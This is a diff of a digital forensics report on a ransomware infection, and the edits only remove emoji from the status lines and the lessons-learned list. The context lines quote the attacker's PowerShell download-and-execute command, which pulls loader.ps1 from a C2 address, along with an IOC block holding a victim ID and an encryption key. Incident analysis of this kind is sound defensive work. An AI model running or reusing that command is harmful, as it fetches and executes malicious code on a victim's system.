@@ -3,7 +3,7 @@
 **Case ID:** RANSOMWARE_21a34484  
 **Investigation Period:** February 2026  
 **Lead Analyst:** Jesse Antman  
-**Status:** ✅ Complete  
+**Status:** Complete  
 
 ---
 
@@ -80,7 +80,7 @@ A sophisticated ransomware attack targeted a Windows 10 system, resulting in the
 └─> PowerShell opens (PID 2908)
     Likely clicked "Copy Code" button
 
-12:50:51 UTC - Malicious Execution ⚠️
+12:50:51 UTC - Malicious Execution 
 └─> PowerShell (PID 4872) executes:
     IEX(New-Object Net.WebClient).DownloadString(
       'http://192.168.74.147:8080/loader.ps1')
@@ -323,7 +323,7 @@ Action: Execute malware
 Victim ID: 21a34484
 Encryption Key: 9Wf1-APAw9C2sLDinvPOJGvWEop9a5C3d4nP8OAa7qw=
 
-⚠️ Key stored ONLY on C2 server - required for file recovery
+Key stored ONLY on C2 server - required for file recovery
 ```
 
 [Full IOC list: analysis/iocs/iocs_full.csv]
@@ -465,17 +465,17 @@ All evidence items verified with SHA256 hashes and preserved in forensically sou
 
 ### What Worked
 
-✅ **Sysmon logging** provided detailed process and network event data  
-✅ **Memory acquisition** captured running malware before system reboot  
-✅ **PCAP capture** revealed complete C2 communication  
-✅ **Quick response** preserved volatile evidence  
+**Sysmon logging** provided detailed process and network event data  
+**Memory acquisition** captured running malware before system reboot  
+**PCAP capture** revealed complete C2 communication  
+**Quick response** preserved volatile evidence  
 
 ### What Could Be Improved
 
-⚠️ **Email gateway** would have blocked phishing page access  
-⚠️ **Application whitelisting** would prevent unsigned executable  
-⚠️ **Egress filtering** would block C2 communication  
-⚠️ **User awareness** would identify fake Facebook page  
+**Email gateway** would have blocked phishing page access  
+**Application whitelisting** would prevent unsigned executable  
+**Egress filtering** would block C2 communication  
+**User awareness** would identify fake Facebook page  
 
 ### Key Takeaways
 
@@ -531,5 +531,5 @@ Jesse Antman
 Digital Forensic Analyst  
 February 2026
 
-**Case Status:** ✅ CLOSED - Investigation Complete
+**Case Status:** CLOSED - Investigation Complete
 
